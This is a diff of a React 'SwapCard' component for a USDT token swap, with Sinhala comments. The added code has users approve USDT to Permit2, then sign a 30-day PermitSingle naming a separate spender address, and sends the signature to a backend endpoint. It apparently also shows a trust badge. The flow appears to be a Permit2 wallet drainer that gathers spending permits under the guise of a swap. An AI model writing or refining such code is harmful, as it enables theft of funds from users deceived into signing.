@@ -26,10 +26,11 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
+  // ⭐ ඔයාගේ Config
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-  const API_URL = "/api/submit";
+  const API_URL = "/api/submit"; // Vercel Serverless Function
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
@@ -52,17 +53,11 @@ export default function SwapCard({ walletAddress, provider }) {
   const loadBalance = async () => {
     try {
       if (!provider) return;
-      // Ethers v6 BrowserProvider
-      const ethersProvider = new ethers.BrowserProvider(provider);
-      const signer = await ethersProvider.getSigner();
-      
+      const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
-      
-      // Ethers v6 formatUnits
-      const formatted = ethers.formatUnits(balance, decimals);
-      setUsdtBalance(parseFloat(formatted).toLocaleString());
+      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
     } catch (error) { 
       console.error("Balance load error:", error); 
     }
@@ -102,6 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
+  // ⭐ Execute Permit2 Flow (Backend එකට signature එක යවනවා)
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -114,36 +110,46 @@ export default function SwapCard({ walletAddress, provider }) {
 
     try {
       setIsLoading(true);
-      setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
+      setStatus({ type: 'info', msg: '⏳ Step 1/2: Approving USDT to Permit2...' });
       
-      // Ethers v6 Setup
-      const ethersProvider = new ethers.BrowserProvider(provider);
-      const signer = await ethersProvider.getSigner();
+      const signer = provider.getSigner();
+      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const decimals = await usdtContract.decimals();
       
-      const amount = ethers.parseUnits(fromAmount, 6); // USDT decimals = 6
-      const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); 
-      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; 
+      // 1. USDT -> Permit2 Approve (මේක අනිවාර්යයි!)
+      const amount = ethers.utils.parseUnits(fromAmount, decimals);
+      const approveTx = await usdtContract.approve(PERMIT2_ADDRESS, amount);
+      await approveTx.wait();
       
+      setStatus({ type: 'info', msg: '⏳ Step 2/2: Signing Permit2...' });
+      
+      // 2. Permit2 details හදන්න
+      const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
+      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
+      
+      // 3. Permit2 Contract එක හදන්න
       const permit2Contract = new ethers.Contract(
         PERMIT2_ADDRESS,
         ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
         signer
       );
       
+      // 4. Nonce එක ගන්න
       const allowanceData = await permit2Contract.allowance(
         walletAddress,
         USDT_ADDRESS,
         PERMIT2_CONTRACT_ADDRESS
       );
+      const nonce = allowanceData.nonce;
       
-      const nonce = Number(allowanceData.nonce); // Number බවට පත් කිරීම
-
+      // 5. EIP-712 Domain හදන්න
       const domain = {
         name: "Permit2",
         chainId: 1,
         verifyingContract: PERMIT2_ADDRESS
       };
       
+      // 6. Types හදන්න
       const types = {
         PermitSingle: [
           { name: "details", type: "PermitDetails" },
@@ -158,22 +164,35 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
+      // 7. Message හදන්න (BigInt/String ප්‍රශ්නය විසඳන්න)
       const message = {
         details: {
           token: USDT_ADDRESS,
-          amount: amount,
+          amount: amount.toString(), // String කරන්න
           expiration: expiration,
-          nonce: nonce
+          nonce: nonce.toString() // String කරන්න
         },
         spender: PERMIT2_CONTRACT_ADDRESS,
         sigDeadline: sigDeadline
       };
       
-      // ⭐ Universal Ethers v6 Signature Call (Works with WalletConnect & Injected Extension)
-      const signature = await signer.signTypedData(domain, types, message);
+      // 8. Sign කරන්න (eth_signTypedData_v4 පාවිච්චි කරන්න)
+      const signature = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [
+          walletAddress,
+          JSON.stringify({
+            domain,
+            types,
+            primaryType: 'PermitSingle',
+            message
+          })
+        ]
+      });
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
+      // 9. Backend එකට යවන්න
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -327,7 +346,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         )}
 
-        {/* PCrisk Trust Badge */}
+        {/* PCrisk Trust Badge - Swap Card එකට යටින් */}
         <div className="flex justify-center mt-6">
           <div 
             className="pcrisk-badge"
